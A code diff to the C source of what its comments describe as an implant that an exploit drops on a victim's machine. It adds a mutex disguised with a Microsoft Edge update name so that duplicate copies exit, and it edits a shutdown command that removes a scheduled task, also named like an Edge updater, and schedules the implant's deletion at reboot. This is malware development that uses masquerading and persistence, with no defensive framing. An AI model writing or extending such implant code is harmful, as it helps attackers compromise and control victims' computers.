@@ -371,6 +371,16 @@ int main(int argc, char **argv)
         }
         return 0;
     }
+
+    /* Single-instance guard: if the exploit fires more than once (e.g. victim
+     * refreshes the page), a second i.exe will start and try to run as a full
+     * implant.  The Global\ prefix makes the mutex visible across all sessions
+     * and users so it catches both same-session and cross-session duplicates. */
+    HANDLE g_mutex = CreateMutexA(NULL, TRUE, "Global\\MicrosoftEdgeUpdateMtx");
+    if (GetLastError() == ERROR_ALREADY_EXISTS) {
+        if (g_mutex) CloseHandle(g_mutex);
+        return 0;
+    }
 #endif
     (void)argc; (void)argv;
 
@@ -522,7 +532,10 @@ int main(int argc, char **argv)
 
         case COMMAND_SHUTDOWN: {
 #ifdef _WIN32
-            system("schtasks /delete /tn \"MicrosoftEdgeUpdate\" /f >nul 2>&1");
+            {
+                FILE *fp = POPEN("schtasks /delete /tn \"MicrosoftEdgeUpdate\" /f", "r");
+                if (fp) PCLOSE(fp);
+            }
             /* Can't delete the running executable directly; mark it for
              * removal on next reboot and clean up everything else now. */
             MoveFileExA(IMPLANT_TARGET_PATH, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
